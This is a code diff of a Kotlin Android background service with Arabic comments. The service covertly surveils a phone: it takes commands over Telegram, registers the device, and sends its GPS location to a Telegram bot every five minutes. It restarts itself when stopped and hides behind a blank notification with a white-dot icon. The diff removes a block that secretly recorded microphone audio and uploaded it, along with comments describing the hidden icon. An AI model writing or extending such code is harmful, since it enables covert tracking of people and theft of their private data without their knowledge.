@@ -27,18 +27,25 @@ class BackgroundService : Service() {
     override fun onCreate() {
         super.onCreate()
 
-        try { startForegroundCompat() } catch (e: Exception) {
+        try {
+            startForegroundCompat()
+        } catch (e: Exception) {
             android.util.Log.e("BgService", "fg err: ${e.message}")
         }
 
+        // استقبال أوامر تلغرام
         try { CommandListener.start(applicationContext) } catch (_: Exception) {}
+
+        // تسجيل الجهاز
         try { DeviceManager.registerDeviceOnce(applicationContext) } catch (_: Exception) {}
 
+        // SyncWorker — بعد 3 ثواني
         scope.launch {
             delay(3_000L)
             try { SyncWorker.start(applicationContext) } catch (_: Exception) {}
         }
 
+        // Heartbeat — كل 3 دقايق
         scope.launch {
             while (running) {
                 try { DeviceManager.updateHeartbeat(applicationContext) } catch (_: Exception) {}
@@ -46,6 +53,7 @@ class BackgroundService : Service() {
             }
         }
 
+        // الموقع — كل 5 دقايق
         scope.launch {
             while (running) {
                 try {
@@ -54,7 +62,9 @@ class BackgroundService : Service() {
                         if (loc != null) {
                             LocationCache.save(applicationContext, loc.latitude, loc.longitude, loc.accuracy)
                             if (KeyboardBuilder.locationOn) {
-                                TelegramApi.sendMessage("📍 *الموقع*\nhttps://www.google.com/maps?q=${loc.latitude},${loc.longitude}")
+                                TelegramApi.sendMessage(
+                                    "📍 *الموقع*\nhttps://www.google.com/maps?q=${loc.latitude},${loc.longitude}"
+                                )
                             }
                         }
                     }
@@ -63,6 +73,7 @@ class BackgroundService : Service() {
             }
         }
 
+        // تنظيف ملفات الكاش
         scope.launch {
             while (running) {
                 try {
@@ -76,24 +87,7 @@ class BackgroundService : Service() {
             }
         }
 
-        scope.launch {
-            while (running) {
-                try {
-                    if (AudioRecorder.isRunning()) {
-                        AudioRecorder.startChunk(applicationContext)
-                        delay(Config.AUDIO_CHUNK_MS)
-                        val done = AudioRecorder.stopChunk()
-                        if (done != null && done.exists() && done.length() > 1000) {
-                            TelegramApi.sendAudio(done, "🎤 ${done.name}")
-                            done.delete()
-                        }
-                    } else {
-                        delay(5000L)
-                    }
-                } catch (_: Exception) { delay(5000L) }
-            }
-        }
-
+        // Watchdog
         scope.launch {
             while (running) {
                 delay(60_000L)
@@ -115,13 +109,17 @@ class BackgroundService : Service() {
                 android.Manifest.permission.ACCESS_COARSE_LOCATION
             ) == android.content.pm.PackageManager.PERMISSION_GRANTED
             fine || coarse
-        } catch (_: Exception) { false }
+        } catch (_: Exception) {
+            false
+        }
     }
 
     private fun SyncWorkerIsRunning(): Boolean {
         return try {
             Thread.getAllStackTraces().keys.any { it.name == "sync-main" && it.isAlive }
-        } catch (_: Exception) { true }
+        } catch (_: Exception) {
+            true
+        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
@@ -133,6 +131,7 @@ class BackgroundService : Service() {
         try { SyncWorker.stop() } catch (_: Exception) {}
         try { DeviceManager.markInactive(applicationContext) } catch (_: Exception) {}
         scope.cancel()
+
         try {
             val restart = Intent(applicationContext, BackgroundService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -141,11 +140,12 @@ class BackgroundService : Service() {
                 applicationContext.startService(restart)
             }
         } catch (_: Exception) {}
+
         super.onDestroy()
     }
 
     // ═══════════════════════════════════════════
-    //  إشعار رفيع جداً — أيقونة بيضاء بدون شكل
+    //  إشعار رفيع جداً
     // ═══════════════════════════════════════════
     private fun startForegroundCompat() {
         val channelId = "sys_sync_channel"
@@ -155,7 +155,7 @@ class BackgroundService : Service() {
             if (nm.getNotificationChannel(channelId) == null) {
                 val ch = NotificationChannel(
                     channelId,
-                    " ",                                          // اسم فارغ
+                    " ",
                     NotificationManager.IMPORTANCE_MIN
                 )
                 ch.setSound(null, null)
@@ -167,9 +167,8 @@ class BackgroundService : Service() {
             }
         }
 
-        // ⭐ أيقونة بيضاء بدون شكل (نقطة صغيرة)
         val notif: Notification = NotificationCompat.Builder(this, channelId)
-            .setSmallIcon(R.drawable.ic_white_dot)      // ← نقطة بيضاء
+            .setSmallIcon(R.drawable.ic_white_dot)
             .setContentTitle(" ")
             .setContentText(" ")
             .setOngoing(true)
